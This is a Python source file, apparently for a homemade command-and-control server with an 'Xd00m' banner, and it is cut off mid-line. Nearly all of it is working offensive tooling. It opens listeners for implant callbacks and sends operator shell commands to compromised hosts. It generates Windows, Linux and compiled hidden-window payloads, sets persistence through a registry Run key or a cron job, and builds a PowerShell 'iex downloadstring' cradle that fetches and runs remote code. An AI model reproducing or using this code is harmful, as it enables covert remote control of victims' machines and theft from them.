import shutil
import socket
import random
import string
import threading
import time
from datetime import datetime
from prettytable import PrettyTable
import os
import subprocess
import base64

def banner():
    print('''
 /$$$$$$   /$$$$$$         /$$$$$$  /$$$$$$$$ /$$$$$$$  /$$    /$$ /$$$$$$$$ /$$$$$$$ 
 /$$__  $$ /$$__  $$       /$$__  $$| $$_____/| $$__  $$| $$   | $$| $$_____/| $$__  $$
| $$  \__/|__/  \ $$      | $$  \__/| $$      | $$  \ $$| $$   | $$| $$      | $$  \ $$
| $$        /$$$$$$/      |  $$$$$$ | $$$$$   | $$$$$$$/|  $$ / $$/| $$$$$   | $$$$$$$/
| $$       /$$____/        \____  $$| $$__/   | $$__  $$ \  $$ $$/ | $$__/   | $$__  $$
| $$    $$| $$             /$$  \ $$| $$      | $$  \ $$  \  $$$/  | $$      | $$  \ $$
|  $$$$$$/| $$$$$$$$      |  $$$$$$/| $$$$$$$$| $$  | $$   \  $/   | $$$$$$$$| $$  | $$
 \______/ |________/       \______/ |________/|__/  |__/    \_/    |________/|__/  |__/
                                                                                       
by Xd00m    ''')

def help():
    print('''                                              
   ___ ___  _ __ ___  _ __ ___   __ _ _ __   __| |
  / __/ _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` |
 | (_| (_) | | | | | | | | | | | (_| | | | | (_| |
  \___\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|
  
  _________________________________________________
  Menu Commands
  _________________________________________________
  
  listeners -g            -> Generate a New Listener
  winplant py             -> Generate a Windows Compatible python payload
  linplant py             -> Generate a Linux Compatible python payload 
  exeplant                -> Generate an Executable Payload for Windows
  sessions -1             -> List Sessions
  session -i <val>        -> Enter a new session
  kill <val>              -> Kill an Active Session
  
  Session Commands
  __________________________________________________
  
  background               -> Background the current session
  exit                     -> Terminate the current session                                            
     
     ''')

def comm_in(targ_id):
    print('[+] Awaiting response')
    try:
        message_rec = targ_id.recv(1024).decode()
        message_rec = base64.b64decode(message_rec).decode().strip()
        return message_rec
    except Exception:
        targ_id.close()
        return None

def comm_out(targ_id, message):
    encoded_message = base64.b64encode(message.encode('utf-8'))
    targ_id.send(encoded_message)

def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('[+] Awaiting client request')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

def kill_sig(targ_id, message):
    encoded_message = base64.b64encode(message.encode('utf-8'))
    targ_id.send(encoded_message)

def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = comm_in(remote_target)
            op_sys = comm_in(remote_target)
            if not username or not op_sys:
                continue

            if 'Windows' in op_sys:
                pay_val = 1
            else:
                pay_val = 2

            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = f"{date.month}/{date.day}/{date.year} {cur_time}"

            try:
                host_name = socket.gethostbyaddr(remote_ip[0])[0]
            except socket.herror:
                host_name = remote_ip[0]

            targets.append([remote_target, f"{host_name}@{remote_ip[0]}", time_record, username, op_sys, pay_val, 'Active'])
            print(f'\n[+] Connection received from {host_name}@{remote_ip[0]}\nEnter Command#>', end="")
        except:
            pass

def target_comm(targ_id, targets, num):
    while True:
        message = input(f'{targets[num][3]}/{targets[num][1]}#>')
        if len(message) == 0:
            continue
        if message == 'help':
            help()
        else:
            comm_out(targ_id, message)
            if message == 'exit':
                comm_out(targ_id, message)
                targ_id.close()
                targets[num][6] = 'Dead'
                break
            if message == 'background':
                break
            if message == 'persist':
                payload_name = input("[+] Enter the name of the payload to autorun: ")
                if targets[num][5] == 1:
                    persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                    comm_out(targ_id, persist_command_1)
                    persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                    comm_out(targ_id, persist_command_2)
                    print('[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v screendoor /f')
                if targets[num][5] == 2:
                    persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
                    comm_out(targ_id, persist_command)
                    print("[+] Run this command to clean up the crontab: \ncrontab -r")
                print('[+] Persistence technique complete')
            else:
                response = comm_in(targ_id)
                if response == 'exit':
                    print('[-] The client has terminated the connection')
                    targ_id.close()
                    break
                print(response)

def generate_payload(template_name, payload_name):
    ran_name = ''.join(random.choices(string.ascii_lowercase, k=6))
    file_name = f'{ran_name}.py'
    check_cwd = os.getcwd()

    if os.path.exists(f'{check_cwd}/{template_name}'):
        shutil.copy(template_name, file_name)
        print(f'[+] Copied {template_name} to {file_name}')
    else:
        print(f'[-] {template_name} file not found')

    with open(file_name) as f:
        content = f.read().replace('127.0.0.1', host_ip).replace('1234', str(host_port))

    with open(file_name, 'w') as f:
        f.write(content)

    if os.path.exists(file_name):
        print(f'[+] {file_name} saved to current directory')
    else:
        print('[-] Error occurred during generation')

def winplant():
    generate_payload('winplant.py', 'Windows')

def linplant():
    generate_payload('linplant.py', 'Linux')

def exeplant():
    ran_name = ''.join(random.choices(string.ascii_lowercase, k=6))
    file_name = f'{ran_name}.py'
    exe_file = f'{ran_name}.exe'
    check_cwd = os.getcwd()

    if os.path.exists(f'{check_cwd}/exeplant.py'):
        shutil.copy('exeplant.py', file_name)
    else:
        print('[-] exeplant.py file not found')

    with open(file_name) as f:
        content = f.read().replace('127.0.0.1', host_ip).replace('1234', str(host_port))

    with open(file_name, 'w') as f:
        f.write(content)

    pyinstaller_exe = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
    print(f'[+] Compiling executable {exe_file}....')
    subprocess.call(pyinstaller_exe, stderr=subprocess.DEVNULL)
    os.remove(f'{file_name}.spec')
    shutil.rmtree('build')

    if os.path.exists(f'{check_cwd}/{exe_file}'):
        print(f'[+] {exe_file} saved to current directory')
    else:
        print('[-] Error occurred during generation')

def pshell_cradle():
    web_server_ip = input('[+] Web Server listening Host: ')
    web_server_port = input('[+] Web Server Port: ')
    payload_name = input('[+] Input payload name: ')
    runner_file = ''.join(random.choices(string.ascii_lowercase, k=6)) + '.txt'
    random_exe_file = ''.join(random.choices(string.ascii_lowercase, k=6)) + '.exe'
    print(f'[+] Run the following command to start a web server:\npython3 -m http.server -b {web_server_ip} {web_server_port}')

    runner_call_unencoded = f"iex (new-object net.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode('
